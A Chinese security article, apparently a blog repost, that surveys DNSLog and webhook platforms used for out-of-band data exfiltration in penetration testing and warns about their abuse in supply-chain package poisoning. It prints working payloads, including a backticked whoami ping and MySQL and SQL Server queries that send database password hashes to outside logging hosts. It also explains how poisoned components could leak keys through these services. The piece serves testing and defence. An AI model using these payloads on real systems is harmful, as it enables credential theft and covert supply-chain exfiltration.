---
title: 渗透测试利器・供应链组件投毒隐患：DNSLog 与 Webhook 平台盘点（无回显漏洞数据外带指南）
url: https://mp.weixin.qq.com/s/3XKSfJTB5yR4XVMLDtw4vg
source: Doonsec's feed
date: 2026-01-17
fetch_date: 2026-01-18T03:36:43.655041
---

# 渗透测试利器・供应链组件投毒隐患：DNSLog 与 Webhook 平台盘点（无回显漏洞数据外带指南）

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7ib8f0KqqP9IHs4XEGvTJAKrQe9SCcCBlW0hOP2YyDyVkqLCsOZ7oeiaA/0?wx_fmt=jpeg)

# 渗透测试利器・供应链组件投毒隐患：DNSLog 与 Webhook 平台盘点（无回显漏洞数据外带指南）

Shelter1234
Shelter1234

安全研究员

![]()

在小说阅读器中沉浸阅读

在渗透测试中，无回显漏洞探测是核心场景之一，涵盖命令执行、表达式执行、URLDNS 反序列化链、SQL 注入、XML 外部实体注入、SSRF、XSS 盲打等典型场景。DNSLog 平台之所以成为这类测试的首选工具，核心逻辑在于：任何 HTTP 请求发起前必然会触发域名解析 —— 即便目标未返回直接响应，只要构造的 payload 中包含 DNSLog 平台的子域名，就能通过平台记录的解析日志，间接验证漏洞是否成功触发，实现 “无回显” 到 “有痕迹” 的转化。

    而在漏洞利用的深层阶段，DNS 解析还可用于轻量级数据携带，但当数据量超出 DNS 隧道的承载能力，或需要复杂交互（如 POST 数据窃取、多轮请求联动）时，支持 HTTP 请求记录甚至自动化处理的平台便成为关键补充。这类平台的优势不仅在于数据传输容量更大，更在于攻击者可通过 HTTP 协议传输数据的过程中，从服务端返回的 Header 头、响应体中，意外捕获到 key、token、服务器标识等敏感信息，进一步扩大攻击战果。

   值得重点关注的是，在供应链安全领域，DNSLog 平台与 Webhook 站点已成为需要重点警惕的 “风险节点”：一方面，攻击者可能利用这类公开平台作为 “数据窃听枢纽”，在供应链上游的组件、代码、配置中植入恶意 payload（如隐藏的 DNS 解析请求、HTTP 回调链接），当下游用户部署或使用受污染的资产时，服务器的敏感数据（如密钥、数据库信息、业务数据）会被悄无声息地回传至攻击者控制的 DNSLog/Webhook 站点，形成长期的数据泄露通道；另一方面，部分供应链相关的第三方服务（如组件更新服务器、配置中心）若存在权限管控缺陷，也可能被攻击者劫持，植入指向 DNSLog/Webhook 的恶意链接，导致供应链全链路的安全风险扩散。因此，在供应链安全防护中，不仅需要监控资产与外部 DNSLog/Webhook 站点的异常通信，还需对供应链上下游的代码、组件进行安全审计，排查是否存在隐藏的恶意回调逻辑，从源头阻断数据窃密通道。

渗透漏洞利用示例

1.某rce无回显

执行payload—— ping `whoami`.e9c91856.dnslog.20220418.xyz.

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7hfEMJMNjlr4rQRhY7FWNw4KJobWWNnR9Lcib5eiam2ibKfCIj9VCe7Cjw/640?wx_fmt=png&from=appmsg)

2.sql 数据外带

mysql:

```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));
```

sqlserver:

```
DECLARE @host varchar(1024);
SELECT @host=(SELECT TOP 1
master.dbo.fn_varbintohexstr(password_hash)
FROM sys.sql_logins WHERE name='sa')
+'.ip.port.b182oj.ceye.io';
EXEC('master..xp_dirtree
"\\'+@host+'\foobar$"');
```

更多sql数据类型的外带参考 http://ceye.io/payloads

组件投毒案例——

1.某node.js

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7nI8QqMy2D4cu9J6wryK6c4E6V1RU5iazlVhcbHibh3W8ra6jwdU8A5HQ/640?wx_fmt=png&from=appmsg)

index.js内容

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7NeAibrMXZtqeKw9LvYv8DOKPec270DhAjlmz8TgYQYbDkFrErnbEbqg/640?wx_fmt=png&from=appmsg)

更多投毒信息参考

https://osv.dev/list

    那么渗透测试者可以选择的平台可由哪些呢，或者说可以被滥用到组件投毒的平台有哪些呢？ 以下从 “渗透测试合法使用” 与 “组件投毒滥用风险” 双视角，梳理专业且常用的平台清单，：

一、纯 DNSLog 平台（无需注册，直接使用，国内老牌平台，操作极简。）

1.https://www.dnslog.cn/ https://dig.pm/ 等

    国内主流的免费 DNSLog 平台，无需注册登录，访问后自动分配临时子域名（如xxx.dnslog.cn），支持自定义前缀构造 payload（如test-xxx.xxx.dnslog.cn），解析记录实时刷新，操作极简。

    渗透测试场景：适用于快速验证 SQL 盲注、SSRF、URLDNS 反序列化等无回显漏洞，无需复杂配置，即时查看结果。

    组件投毒滥用风险：攻击者可在恶意组件（如第三方库、脚本、配置文件）中植入包含该平台子域名的 DNS 请求代码（如nslookup {敏感数据}.xxx.dnslog.cn），当用户部署组件后，服务器的密钥、主机名等敏感信息会通过 DNS 解析记录回传至平台，攻击者通过监控平台日志窃取数据。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7BdZTr6Ia9ibJg31jZzxvRXrynib3q2ibAPHtDgBficm8UOqWC2b7RslibAA/640?wx_fmt=png&from=appmsg)

2.https://dnslog.org/

    轻量型 DNSLog 平台，FOFA 指纹对应app="DNSLog-Platform-Golang"，稳定性强、响应速度快，同样无需注册，支持自定义子域名前缀，解析记录保留时间较短（降低被溯源风险）。

    渗透测试场景：适合批量验证漏洞（如批量 URL 的 SSRF 探测），脚本中可通过正则提取平台生成的子域名，自动构造 payload 并查询解析记录。

    组件投毒滥用风险：恶意组件中植入动态生成的子域名（绑定当前服务器信息），通过平台日志收集大量下游用户的服务器指纹、网络环境等数据，为后续精准攻击铺路。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7jpw08jN90wQ7mPtiaQFELs7DyQvo7LfWwtbKu3SRW1dUrRMonkrGSjg/640?wx_fmt=png&from=appmsg)

3.Burp Suite 内置 Burp Collaborator

    渗透测试人员的“御用”工具。渗透测试工具原生集成的 DNS/HTTP 监控模块，无需额外访问第三方平台。

    渗透测试场景：打开 Burp Suite 后，进入「Burp Collaborator」模块即可获取专属子域名（如 qqq.yce0iu59oral2nnu2y7l6npyipogc60v.oastify.com），DNS 查询不区分大小写，构造 payload 后通过「Poll now」功能实时查看解析记录与 HTTP 请求，完美适配渗透测试流程。

    组件投毒滥用风险：攻击者若将恶意组件中的回调地址指向自己控制的 Burp Collaborator 子域名，可精准捕获目标服务器的出站通信。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7wvbgu9LKpHvF4eavrcSEgNAXs8tiaj8FkowiabxJhKa1qEniaUAM1mibrA/640?wx_fmt=png&from=appmsg)

二，HTTP 请求日志类平台

    这类平台核心能力是完整记录 HTTP 请求的全量细节（含请求头、查询参数、POST 数据、来源 IP、响应体等），完美适配 DNS 协议被拦截、数据量较大（超 DNS 隧道承载上限）或需要复杂交互（如多轮数据回传、结构化数据窃取）的场景。在渗透测试中，可作为 DNSLog 平台的补充工具，验证 HTTP 出站类漏洞；而在组件投毒攻击中，其 “长期存储、数据结构化、支持复杂处理” 的特性，使其成为攻击者长期窃取敏感数据（如业务核心数据、接口密钥、环境变量）的优选载体 —— 通过在恶意组件中植入指向平台的 HTTP 请求逻辑，可实现隐蔽且持续的数据外泄。

1.webhook.site (支持dnslog)

    经典且功能全面的 HTTP 请求捕获与 DNS 解析记录一体化平台。核心特性包括：无需注册即可生成专属回调 URL，实时记录 HTTP/HTTPS 请求的完整信息（含请求头、FormData、JSON 体、来源 IP、User-Agent），同时支持 DNSLog 功能（自动分配子域名，兼容 DNS 解析验证场景）；日志支持实时推送、导出与检索，数据保留时间可满足短期测试与长期窃密需求。

    渗透测试场景：适用于验证 XSS 盲打、SSRF、命令执行等漏洞，尤其适合目标仅开放 HTTP 出站、DNS 协议被屏蔽的环境；

    组件投毒滥用风险：攻击者可在恶意组件中植入动态生成的回调 URL（携带服务器敏感数据作为参数），通过平台日志实时捕获数据，且因平台支持 DNS/HTTP 双协议，可灵活适配不同网络环境，降低被检测概率。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7hxxneFxLHjECsEe9SblicUcOY0p3Z5gH7VJ0DDWR6W3Q1MaG7fTO9dQ/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV72XOAEmx3dfbLMibcicFRQ65rUOWWYobh2nTTRqqJV3q5b8dl01wUBW1Q/640?wx_fmt=jpeg&from=appmsg)

2. baldedolixo.s3np41.com (支持dnslog)

    集 HTTP 请求捕获与 DNSLog 功能于一体的轻量平台。支持自定义子域名构造 DNS 解析请求，同时可记录 HTTP 请求的关键参数与来源信息，操作极简且无需注册，响应速度快。

    渗透测试场景：适合快速验证无回显漏洞，兼顾 DNS 解析与 HTTP 回传两种验证方式，适配多场景测试需求；

    组件投毒滥用风险：因无使用门槛、日志隐蔽性强，攻击者常将其用于批量窃取下游用户服务器数据 —— 在恶意组件中植入包含服务器标识、密钥信息的 DNS/HTTP 请求，通过平台日志批量收集目标资产敏感数据。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7AuoDJDJN9TdniaiciaP2l04sGYP2jUbWpniadIbh3BWT0iaxhMXKk0Pzyicg/640?wx_fmt=jpeg&from=appmsg)

3.app.hooklistener.com(需要登录)

    为开发者提供的上位机（App）配套 Webhook 服务平台，需注册登录后生成专属回调地址。支持跨端 HTTP 请求捕获，可同步接收来自桌面端、服务器端、移动设备的请求数据，且支持数据结构化存储与导出。

    渗透测试场景：适合验证需跨端触发的漏洞（如移动应用组件漏洞、桌面软件 HTTP 出站漏洞）；

    组件投毒滥用风险：虽需登录，但攻击者可通过匿名账号生成专属地址，在恶意组件（尤其是桌面端、移动端组件）中植入回调逻辑，长期窃取用户设备或服务器的敏感数据（如配置文件内容、业务操作日志），且因平台定位为 “开发者工具”，恶意请求易被混淆为正常开发测试流量。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7cZAfFlyoM9M0PIxQicmVGUzuRokBJicjAyXUSqCfQsiaJImQGdPtECGmg/640?wx_fmt=jpeg&from=appmsg)

4.https://pipedream.com/docs/workflows/quickstart

    远超普通请求接收器的强大开发者集成平台，核心优势在于 “请求接收 + 数据处理 + 多应用联动” 的全链路能力。用户可创建 Project 与 Workflow，生成唯一触发 URL，不仅能捕获 HTTP 请求的全量数据，还可通过内置的代码执行模块（支持 Node.js、Python、Go 等）对接收的数据进行实时处理（如解析加密数据、提取关键字段、格式转换），并联动 Google Sheets、Slack 等 1000+ 应用进行数据同步。

    渗透测试场景：适用于复杂漏洞验证（如需要对窃取的加密数据实时解密、对批量数据进行结构化分析），或自动化测试流程（如将漏洞触发记录自动同步至测试报告工具）；

    组件投毒滥用风险：是组件投毒中 “精准窃密 + 数据加工” 的高危平台 —— 攻击者可在恶意组件中植入指向该平台的请求逻辑，将窃取的敏感数据（如数据库连接串、接口 Token）发送至触发 URL，通过平台 Workflow 自动提取核心信息并同步至私人存储（如 Google 表格、云盘），实现 “窃取 - 处理 - 存储” 的自动化闭环，隐蔽性与危害性极强。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7sGibia5yG17xEPuaKpFssvNEX2MU2d9AAt3FvQJNdt3HmtGwsSCP7lGQ/640?wx_fmt=jpeg&from=appmsg)

5.https://requestinspector.com/ （仅支持http）

    专注于 HTTP 请求捕获的专业工具，提供公共与私有两种使用模式。公共模式无需注册，生成临时捕获 URL，支持记录 100 条请求记录（保留 2 天）；私有模式需登录，可存储 250 条记录（保留 10 天），支持密码保护与分享链接，请求处理速率上限为 20  req/sec，单请求大小限制 64KB。

    渗透测试场景：适合短期 HTTP 出站漏洞验证，公共模式无需注册即可快速使用，私有模式可满足敏感测试数据的安全存储需求；

    组件投毒滥用风险：公共模式无身份校验，攻击者可批量生成捕获 URL 植入不同恶意组件，窃取多目标服务器数据；私有模式支持密码保护，可规避日志被他人查看的风险，适合长期、定向的数据窃取。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7bcZiabYQbciaSuerDZeoVyJTtZB4WCibK4cDsGD394kRZKKnB6AT4puxw/640?wx_fmt=jpeg&from=appmsg)

6.https://webhook.cool/ （仅支持http）

    极简设计的在线 Webhook 测试器，无需注册即可生成唯一专属 URL，支持接收各类 Webhook 请求并实时展示请求详情。平台无复杂功能，聚焦 “快速捕获、清晰展示”，Webhook 记录会在 7 天无活动后自动删除。

    渗透测试场景：适合快速验证简单 HTTP 出站漏洞（如 SSRF 中 HTTP 地址可达性测试），操作零门槛，无需配置额外参数；

    组件投毒滥用风险：因 URL 生成便捷、无使用痕迹，攻击者常将其用于短期批量数据窃取 —— 在恶意组件中植入请求逻辑，将服务器基础信息（如主机名、系统版本）作为参数发送，利用 7 天的记录保留期完成数据收集，降低被溯源风险。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV74wickXbVeShd6l1UMHvwrmmibwDWFXLCs3HKCF9fEzwYngVn44FMxEYA/640?wx_fmt=jpeg&from=appmsg)

7.https://webhoook.me （仅支持POST http）

    专注于 POST 请求测试的轻量化平台，无需注册即可获取专属接收 URL，支持实时捕获 POST 请求的参数、JSON 体、请求头与来源 IP，所有接收的 Webhook 记录会保留 24 小时，无请求数量限制，且无需安装额外软件，仅需浏览器即可使用。

    渗透测试场景：适合验证仅支持 POST 方法的漏洞（如 POST 型 SSRF、表单提交类 XSS 盲打），24 小时的记录保留期可满足短期测试需求；

    组件投毒滥用风险：仅支持 POST 方法的特性可规避部分简单防护规则（如仅拦截 GET 型外部请求），攻击者可在恶意组件中通过 POST 请求将敏感数据（如接口调用日志、用户信息）封装为 JSON 格式发送，利用平台无请求限制的特点，实现大规模、持续的数据窃取。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6mJWHPYFey1NIwfbCgCXC6f1sibW6nxV7ibDBHNNfp...